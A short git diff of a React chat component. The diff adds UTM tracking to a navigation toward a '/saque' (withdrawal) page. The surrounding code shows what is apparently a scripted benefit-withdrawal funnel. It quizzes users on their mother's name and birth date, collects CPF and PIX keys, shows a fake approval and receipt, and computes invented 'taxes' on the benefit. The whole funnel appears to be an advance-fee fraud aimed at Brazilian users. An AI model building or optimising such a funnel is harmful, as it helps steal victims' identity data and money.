@@ -12,6 +12,7 @@ import {
   DialogTitle,
 } from "@/components/ui/dialog";
 import { saveSession, getSession } from "@/hooks/useSessionPersistence";
+import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
 
 type ChatStep = "waiting-video" | "greeting" | "quiz-mae" | "quiz-nascimento" | "identity-confirmed" | "audio-3-validation" | "waiting-confirm-validation" | "show-approval-animation" | "pix-type-selection" | "pix-cpf-input" | "pix-email-input" | "pix-confirm" | "audio-2-comprovante" | "generating-comprovante" | "envio-selection" | "sms-input" | "email-input" | "audio-1-taxas" | "taxa-info" | "processing" | "final";
 interface QuizOption {
@@ -566,7 +567,7 @@ const Chat = () => {
     const ipti = valorBeneficio * 0.0025;
     const ipri = valorBeneficio * 0.0025;
     const totalImposto = ipct + ipti + ipri;
-    navigate("/saque", {
+    navigate(buildUrlWithUtm("/saque"), {
       state: {
         cpfData,
         valorBeneficio,
